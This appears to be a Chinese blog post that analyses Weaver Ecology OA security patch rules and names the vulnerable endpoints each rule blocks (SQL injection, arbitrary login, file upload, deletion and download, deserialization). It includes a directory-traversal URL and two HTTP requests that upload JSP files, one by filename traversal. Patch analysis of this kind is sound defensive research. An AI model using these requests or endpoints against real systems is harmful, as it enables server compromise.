<h4 id="SecurityRule39-1"><a href="#SecurityRule39-1" class="headerlink" title="SecurityRule39"></a>SecurityRule39</h4><p>限制对<code>/api/integration/simplesso/gettoken</code>路径访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215632401.png"><br>SSO任意用户登录漏洞<del>，似乎是定制包错误推到主版本了？</del><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215632857.png"><br>配合<code>/api/integration/simplesso/getuser</code>接口可登录任意用户<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215633227.png"></p>
<h4 id="SecurityRule46-1"><a href="#SecurityRule46-1" class="headerlink" title="SecurityRule46"></a>SecurityRule46</h4><p>对路径<code>weaver.formmode.data.filedownload</code>、<code>weaver.file.excelout</code>传入参数<code>filename</code>、<code>path</code>进行参数检测，禁止跨目录<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215633489.png"></p>
<h4 id="SecurityRuleBlog-1"><a href="#SecurityRuleBlog-1" class="headerlink" title="SecurityRuleBlog"></a>SecurityRuleBlog</h4><p>检测路径<code>api/blog/base/saveorupdateblog</code>、<code>blogoperation.jsp</code></p>
<h5 id="x2F-blogoperation-jsp"><a href="#x2F-blogoperation-jsp" class="headerlink" title="* &#x2F;blogoperation.jsp"></a>* &#x2F;blogoperation.jsp</h5><p>大量SQL注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215633732.png"></p>
<h5 id="api-x2F-blog-x2F-base-x2F-saveorupdateblog"><a href="#api-x2F-blog-x2F-base-x2F-saveorupdateblog" class="headerlink" title="api&#x2F;blog&#x2F;base&#x2F;saveorupdateblog"></a>api&#x2F;blog&#x2F;base&#x2F;saveorupdateblog</h5><p>没看懂修了个啥 像是注入</p>
<h4 id="SecurityRuleCloudstoreControlServlet-1"><a href="#SecurityRuleCloudstoreControlServlet-1" class="headerlink" title="SecurityRuleCloudstoreControlServlet"></a>SecurityRuleCloudstoreControlServlet</h4><p>拦截路径<code>cloudstore/system/ControlServlet.jsp</code>，该路径可调用53个<code>action</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215634053.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215634294.png"></p>
<h4 id="SecurityRuleCRTDir"><a href="#SecurityRuleCRTDir" class="headerlink" title="SecurityRuleCRTDir"></a>SecurityRuleCRTDir</h4><p>拦截对<code>page/maint/common/customresourcelist</code>的访问，实际接口文件为<code>page/maint/common/CustomResourceList.jsp</code>找了下发现涉及到路径<code>/weaver/weaver.page.maint.common.CustomResourceServlet</code>，类<code>weaver.page.maint.common.CustomResourceServlet#doPost</code><br>构造POST包可后台上传文件，<del>配合<code>rename</code>方法可<code>getshell</code>？</del>测试后不行，过滤较严格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /weaver/weaver.page.maint.common.CustomResourceServlet?currentDir=image.admin&amp;method=uploadFile&amp;dir=ecology9 HTTP/1.1</span><br><span class="line">Host: 10.10.10.38</span><br><span class="line">User-Agent: insomnia/2022.6.0</span><br><span class="line">Cookie: ecology_JSessionid=aaapCDhzF1iSL5QUj01qy</span><br><span class="line">Content-Type: multipart/form-data; boundary=X-INSOMNIA-BOUNDARY</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 160</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">--X-INSOMNIA-BOUNDARY</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.gif&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;%out.println(&quot;Hello world!&quot;);%&gt;</span><br><span class="line">--X-INSOMNIA-BOUNDARY--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上传后路径为<code>d:\WEAVER\ecology\page\resource\userfile\ecology9\test.gif</code></p>
<h4 id="SecurityRuleCtrip-1"><a href="#SecurityRuleCtrip-1" class="headerlink" title="SecurityRuleCtrip"></a>SecurityRuleCtrip</h4><p>对<code>mobile/plugin/ctrip</code>、<code>mobile/plugin/alitrip</code>路径拦截，2011、2112版本无该路径，2204存在<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215634606.png"></p>
<h4 id="SecurityRuleDir"><a href="#SecurityRuleDir" class="headerlink" title="SecurityRuleDir"></a>SecurityRuleDir</h4><p><code>SecurityRuleCRTDir</code>规则的加强版，进一步对<code>/weaver/weaver.page.maint.common.CustomResourceServlet</code>路径进行针对性限制<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215634861.png"></p>
<h4 id="SecurityRuleDocLogQX-1"><a href="#SecurityRuleDocLogQX-1" class="headerlink" title="SecurityRuleDocLogQX"></a>SecurityRuleDocLogQX</h4><p>对路径<code>report/rpmodifydoc</code>和<code>docs/docs/docdownloadlog.jsp</code>进行限制</p>
<h5 id="report-x2F-rpmodifydoc"><a href="#report-x2F-rpmodifydoc" class="headerlink" title="report&#x2F;rpmodifydoc"></a>report&#x2F;rpmodifydoc</h5><p>一堆注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215635127.png"></p>
<h5 id="docs-x2F-docs-x2F-docdownloadlog-jsp-1"><a href="#docs-x2F-docs-x2F-docdownloadlog-jsp-1" class="headerlink" title="docs&#x2F;docs&#x2F;docdownloadlog.jsp"></a>docs&#x2F;docs&#x2F;docdownloadlog.jsp</h5><p>一堆注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215635448.png"></p>
<h4 id="SecurityRuleDownloadNews-1"><a href="#SecurityRuleDownloadNews-1" class="headerlink" title="SecurityRuleDownloadNews"></a>SecurityRuleDownloadNews</h4><h5 id="x2F-weaver-x2F-weaver-file-filedownloadfornews"><a href="#x2F-weaver-x2F-weaver-file-filedownloadfornews" class="headerlink" title="&#x2F;weaver&#x2F;weaver.file.filedownloadfornews"></a>&#x2F;weaver&#x2F;weaver.file.filedownloadfornews</h5><p>对传入的<code>fileid</code>进行过滤 2011版本无该参数<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215636758.png"></p>
<h5 id="x2F-weaver-x2F-weaver-email-FileDownloadLocation"><a href="#x2F-weaver-x2F-weaver-email-FileDownloadLocation" class="headerlink" title="&#x2F;weaver&#x2F;weaver.email.FileDownloadLocation"></a>&#x2F;weaver&#x2F;weaver.email.FileDownloadLocation</h5><p>SQL注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215637094.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215637395.png"></p>
<h5 id="x2F-weaver-x2F-weaver-homepage-HomepageCreateImage"><a href="#x2F-weaver-x2F-weaver-homepage-HomepageCreateImage" class="headerlink" title="&#x2F;weaver&#x2F;weaver.homepage.HomepageCreateImage"></a>&#x2F;weaver&#x2F;weaver.homepage.HomepageCreateImage</h5><p>在<code>weaver.file.ImageFileManager#getImageFileInfoById</code>这里存在注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215637726.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215637994.png"></p>
<h4 id="SecurityRuleDUpload"><a href="#SecurityRuleDUpload" class="headerlink" title="SecurityRuleDUpload"></a>SecurityRuleDUpload</h4><p>对路径<code>debug/upload.jsp</code>进行拦截<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215638321.png"><br>回溯了下发现早在10.23就修了，是个反序列化漏洞<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215638575.png"></p>
<h4 id="SecurityRuleFieldBrowser1201-1"><a href="#SecurityRuleFieldBrowser1201-1" class="headerlink" title="SecurityRuleFieldBrowser1201"></a>SecurityRuleFieldBrowser1201</h4><p>对路径<code>/workflow/fieldbrowser.jsp</code>进行过滤，漏洞文件<code>workflow/workflow/fieldBrowser.jsp</code>是个注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215638849.png"></p>
<h4 id="SecurityRuleFileDown056-1"><a href="#SecurityRuleFileDown056-1" class="headerlink" title="SecurityRuleFileDown056"></a>SecurityRuleFileDown056</h4><p>在老规则基础上添加任意文件删除过滤</p>
<h5 id="x2F-api-x2F-ec-x2F-dev-x2F-table-x2F-cleartemp"><a href="#x2F-api-x2F-ec-x2F-dev-x2F-table-x2F-cleartemp" class="headerlink" title="&#x2F;api&#x2F;ec&#x2F;dev&#x2F;table&#x2F;cleartemp"></a>&#x2F;api&#x2F;ec&#x2F;dev&#x2F;table&#x2F;cleartemp</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215639119.png"></p>
<h4 id="SecurityRuleForbidden060"><a href="#SecurityRuleForbidden060" class="headerlink" title="SecurityRuleForbidden060"></a>SecurityRuleForbidden060</h4><h5 id="x2F-api-x2F-ec-x2F-tool-x2F-validate-x2F-check"><a href="#x2F-api-x2F-ec-x2F-tool-x2F-validate-x2F-check" class="headerlink" title="&#x2F;api&#x2F;ec&#x2F;tool&#x2F;validate&#x2F;check"></a>&#x2F;api&#x2F;ec&#x2F;tool&#x2F;validate&#x2F;check</h5><p>E9无此路径</p>
<h4 id="SecurityRuleForbiddenExamples"><a href="#SecurityRuleForbiddenExamples" class="headerlink" title="SecurityRuleForbiddenExamples"></a>SecurityRuleForbiddenExamples</h4><p>禁掉<code>*/example/*</code>页面</p>
<h4 id="SecurityRuleForDir"><a href="#SecurityRuleForDir" class="headerlink" title="SecurityRuleForDir"></a>SecurityRuleForDir</h4><h5 id="mobilemode-x2F-showdata-jsp"><a href="#mobilemode-x2F-showdata-jsp" class="headerlink" title="mobilemode&#x2F;showdata.jsp"></a>mobilemode&#x2F;showdata.jsp</h5><p>禁掉<code>mobilemode/showdata.jsp</code>页面<br>是一个任意用户登录<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215639373.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215639623.png"></p>
<h5 id="jqueryfiletree-jsp"><a href="#jqueryfiletree-jsp" class="headerlink" title="jqueryfiletree.jsp"></a>jqueryfiletree.jsp</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215639862.png"><br><code>jqueryfiletree</code>插件demo文件泄露，目录遍历<code>hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215640097.png"></p>
<h4 id="SecurityRuleForFastJsonSafeMode"><a href="#SecurityRuleForFastJsonSafeMode" class="headerlink" title="SecurityRuleForFastJsonSafeMode"></a>SecurityRuleForFastJsonSafeMode</h4><p>启用<code>fastjson</code>的安全模式<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215640337.png"></p>
<h4 id="SecurityRuleMLogin"><a href="#SecurityRuleMLogin" class="headerlink" title="SecurityRuleMLogin"></a>SecurityRuleMLogin</h4><h5 id="mobile-x2F-plugin-x2F-verifyquicklogin-jsp"><a href="#mobile-x2F-plugin-x2F-verifyquicklogin-jsp" class="headerlink" title="mobile&#x2F;plugin&#x2F;verifyquicklogin.jsp"></a>mobile&#x2F;plugin&#x2F;verifyquicklogin.jsp</h5><p>对该路径做检查，如果xml配置中<code>isable-quick-login-check</code>为<code>true</code>则跳过检查，此处是ecology8任意用户登录<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215640569.png"></p>
<h4 id="SecurityRuleMobile29-1"><a href="#SecurityRuleMobile29-1" class="headerlink" title="SecurityRuleMobile29"></a>SecurityRuleMobile29</h4><p>对路径中含有<code>mobilemode</code>、<code>mobile</code>、<code>cpt</code>且后缀为<code>.jsp</code>的路径进行检查<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215640845.png"></p>
<h4 id="SecurityRuleNeedLogin"><a href="#SecurityRuleNeedLogin" class="headerlink" title="SecurityRuleNeedLogin"></a>SecurityRuleNeedLogin</h4><p>对路径<code>weaver.org.layout.downloaddeptLayoutservlet</code>进行校验，非登录态则拦截<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215641074.png"></p>
<h4 id="SecurityRuleNet48"><a href="#SecurityRuleNet48" class="headerlink" title="SecurityRuleNet48"></a>SecurityRuleNet48</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215641384.png"></p>
<h5 id="x2F-docs-x2F-networkdisk-x2F-adddownloadfiletemp-jsp"><a href="#x2F-docs-x2F-networkdisk-x2F-adddownloadfiletemp-jsp" class="headerlink" title="&#x2F;docs&#x2F;networkdisk&#x2F;adddownloadfiletemp.jsp"></a>&#x2F;docs&#x2F;networkdisk&#x2F;adddownloadfiletemp.jsp</h5><p><code>docs/networkdisk/addDownloadFileTemp.jsp</code>存在注入，参数<code>downloadpath</code>需要<code>base64</code>编码<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215641712.png"></p>
<h5 id="x2F-docs-x2F-networkdisk-x2F-createsyncfolder-jsp"><a href="#x2F-docs-x2F-networkdisk-x2F-createsyncfolder-jsp" class="headerlink" title="&#x2F;docs&#x2F;networkdisk&#x2F;createsyncfolder.jsp"></a>&#x2F;docs&#x2F;networkdisk&#x2F;createsyncfolder.jsp</h5><p><code>filePathArray</code>参数存在注入</p>
<h4 id="SecurityRulePageTemplateLoginOperate"><a href="#SecurityRulePageTemplateLoginOperate" class="headerlink" title="SecurityRulePageTemplateLoginOperate"></a>SecurityRulePageTemplateLoginOperate</h4><h5 id="page-x2F-maint-x2F-template-x2F-login-news-x2F-operate-jsp"><a href="#page-x2F-maint-x2F-template-x2F-login-news-x2F-operate-jsp" class="headerlink" title="page&#x2F;maint&#x2F;template&#x2F;(login||news)&#x2F;operate.jsp"></a>page&#x2F;maint&#x2F;template&#x2F;(login||news)&#x2F;operate.jsp</h5><p>对权限进行验证，未登录或无权限则拦截<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215641986.png"><br>SQL注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215642233.png"></p>
<h4 id="SecurityRuleSIS"><a href="#SecurityRuleSIS" class="headerlink" title="SecurityRuleSIS"></a>SecurityRuleSIS</h4><p>对路径<code>/weaver/weaver.page.style.StyleImpServlet</code>进行加黑<br>一处授权后的任意文件上传<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215642506.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /weaver/weaver.page.style.StyleImpServlet/ HTTP/1.1</span><br><span class="line">Host: *********</span><br><span class="line">Content-Length: 307</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQ0YfMnMlwjBDTUZZ</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: testBanCookie=test; loginfileweaver=%2Fwui%2Ftheme%2Fecology8%2Fpage%2Flogin.jsp%3FtemplateId%3D3%26logintype%3D1%26gopage%3D; languageidweaver=7; ecology_JSessionId=abc6Oo38alVLYcuIvyi8x; loginidweaver=1128</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryQ0YfMnMlwjBDTUZZ</span><br><span class="line">Content-Disposition: form-data; name=&quot;type&quot;</span><br><span class="line"></span><br><span class="line">element</span><br><span class="line">------WebKitFormBoundaryQ0YfMnMlwjBDTUZZ</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../11.jsp.&quot;</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">&lt;% out.println(&quot;hello&quot;);%&gt;</span><br><span class="line">------WebKitFormBoundaryQ0YfMnMlwjBDTUZZ--</span><br></pre></td></tr></table></figure>
<p>访问路径<code>/page/style/element/11.jsp</code></p>
<h4 id="SecurityRuleSso44-1"><a href="#SecurityRuleSso44-1" class="headerlink" title="SecurityRuleSso44"></a>SecurityRuleSso44</h4><p>对路径<code>/login/verifyssologin.jsp</code>进行参数校验，原始漏洞看描述为注入，但是代码中体现的是任意用户登录<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215642754.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215642979.png"></p>
<h4 id="SecurityRuleThemeOperation"><a href="#SecurityRuleThemeOperation" class="headerlink" title="SecurityRuleThemeOperation"></a>SecurityRuleThemeOperation</h4><p>多处SQL注入，路径<code>portal/plugin/homepage/ecology7theme/themeOperation.jsp</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215643220.png"></p>
<h4 id="XfireServletSecurityRule"><a href="#XfireServletSecurityRule" class="headerlink" title="XfireServletSecurityRule"></a>XfireServletSecurityRule</h4><p><code>Xstream</code>反序列化，参考<code>https://forum.butian.net/share/152</code></p>
<h3 id="Ecology-security-20210623-v10-40"><a href="#Ecology-security-20210623-v10-40" class="headerlink" title="Ecology_security_20210623_v10.40"></a>Ecology_security_20210623_v10.40</h3><h4 id="SecurityRuleCloudstoreJsp"><a href="#SecurityRuleCloudstoreJsp" class="headerlink" title="SecurityRuleCloudstoreJsp"></a>SecurityRuleCloudstoreJsp</h4><p>对<code>/cloudstore/[a-z0-9_]&#123;1,32&#125;\.jsp</code>的<code>webshell</code>路径加黑<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215643481.png"></p>
<h4 id="HomePageSecurityRule"><a href="#HomePageSecurityRule" class="headerlink" title="HomePageSecurityRule"></a>HomePageSecurityRule</h4><p>对路径含<code>homepage.jsp</code>页面加黑，存在self-XSS漏洞<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215643799.png"></p>
<h4 id="SecurityRuleGoPage"><a href="#SecurityRuleGoPage" class="headerlink" title="SecurityRuleGoPage"></a>SecurityRuleGoPage</h4><p>对<code>gopage</code>参数做校验，过滤掉特殊字符，防恶意跳转<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215644040.png"></p>
<h3 id="Ecology-security-20210721-v10-41"><a href="#Ecology-security-20210721-v10-41" class="headerlink" title="Ecology_security_20210721_v10.41"></a>Ecology_security_20210721_v10.41</h3><h4 id="SecurityRuleDyf"><a href="#SecurityRuleDyf" class="headerlink" title="SecurityRuleDyf"></a>SecurityRuleDyf</h4><p>对路径<code>cloudstore/system/gotocloudstore4test.jsp</code>进行拦截，对文件<code>cloudstore&quot;/system/gotocloudstore.jsp&quot;</code>检测是否含有<code>daiyingfeng</code>关键字。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215644302.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215644553.png"><br>搜索后是一个域名<code>daiyingfeng.com</code></p>
<h4 id="SecurityRuleMobileMode"><a href="#SecurityRuleMobileMode" class="headerlink" title="SecurityRuleMobileMode"></a>SecurityRuleMobileMode</h4><p>干掉可以反射调用任意类且类名为<code>com.weaver.formmodel.mobile.ui.servlet.MobileAppUploadAction</code>，<code>action</code>为<code>image、file、file2</code>的请求，任意文件上传，补丁后仅<code>sysadmin</code>登录后可用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215644836.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215645129.png"></p>
<h3 id="Ecology-security-20210824-v10-42"><a href="#Ecology-security-20210824-v10-42" class="headerlink" title="Ecology_security_20210824_v10.42"></a>Ecology_security_20210824_v10.42</h3><h4 id="删除信息泄露"><a href="#删除信息泄露" class="headerlink" title="删除信息泄露"></a>删除信息泄露</h4><p>删除<code>Ecology_security_20190213_v10.10</code>包引入的信息泄露<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215645373.png"></p>
<h4 id="SecurityRuleForMould0915"><a href="#SecurityRuleForMould0915" class="headerlink" title="SecurityRuleForMould0915"></a>SecurityRuleForMould0915</h4><p>对路径<code>odoc/odoc/index_odocPrintwps.jsp</code>进行拦截，任意文件上传<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215645652.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215645930.png"><br>测试无权限访问<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215646163.png"></p>
<h4 id="置空-odoc-x2F-odoc-x2F-odoc-double-screen-jsp文件"><a href="#置空-odoc-x2F-odoc-x2F-odoc-double-screen-jsp文件" class="headerlink" title="置空 odoc&#x2F;odoc&#x2F;odoc_double_screen.jsp文件"></a>置空 odoc&#x2F;odoc&#x2F;odoc_double_screen.jsp文件</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215646489.png"></p>
<h3 id="Ecology-security-20211226-v10-43"><a href="#Ecology-security-20211226-v10-43" class="headerlink" title="Ecology_security_20211226_v10.43"></a>Ecology_security_20211226_v10.43</h3><h4 id="SecurityRuleSQL50"><a href="#SecurityRuleSQL50" class="headerlink" title="SecurityRuleSQL50"></a>SecurityRuleSQL50</h4><p>拦截<code>api/portal/elementecodeaddon/getsqldata</code>，任意SQL语句执行漏洞<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215646766.png"></p>
<h4 id="SecurityRuleTableDev0308"><a href="#SecurityRuleTableDev0308" class="headerlink" title="SecurityRuleTableDev0308"></a>SecurityRuleTableDev0308</h4><h5 id="x2F-api-x2F-ec-x2F-dev-x2F-table-x2F-cleartemp-1"><a href="#x2F-api-x2F-ec-x2F-dev-x2F-table-x2F-cleartemp-1" class="headerlink" title="&#x2F;api&#x2F;ec&#x2F;dev&#x2F;table&#x2F;cleartemp"></a>&#x2F;api&#x2F;ec&#x2F;dev&#x2F;table&#x2F;cleartemp</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215647044.png"><br>拦截任意文件删除<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215647334.png"></p>
<h5 id="x2F-api-x2F-common-x2F-log-x2F-audit-x2F-getfile"><a href="#x2F-api-x2F-common-x2F-log-x2F-audit-x2F-getfile" class="headerlink" title="&#x2F;api&#x2F;common&#x2F;log&#x2F;audit&#x2F;getfile"></a>&#x2F;api&#x2F;common&#x2F;log&#x2F;audit&#x2F;getfile</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215647604.png"><br>拦截任意文件下载<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215647871.png"></p>
<h5 id="x2F-api-x2F-odoc-x2F-odocFile-x2F-confirmTemplate"><a href="#x2F-api-x2F-odoc-x2F-odocFile-x2F-confirmTemplate" class="headerlink" title="&#x2F;api&#x2F;odoc&#x2F;odocFile&#x2F;confirmTemplate"></a>&#x2F;api&#x2F;odoc&#x2F;odocFile&#x2F;confirmTemplate</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215648134.png"><br>拦截任意文件上传<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/image-20230403-215648404.png"></p>
<h5 id="x2F-api-x2F-v1-x2F-3rd-x2F-file-x2F-save"><a href="#x2F-api-x2F-v1-x2F-3rd-x2F-file-x2F-save" class="headerlink" title="&#x2F;api&#x2F;v1&#x2F;3rd&#x2F;file&#x2F;save"></a>&#x2F;api&#x2F;v1&#x2F;3rd&#x2F;file&#x2F;save</h5><p>未知</p>
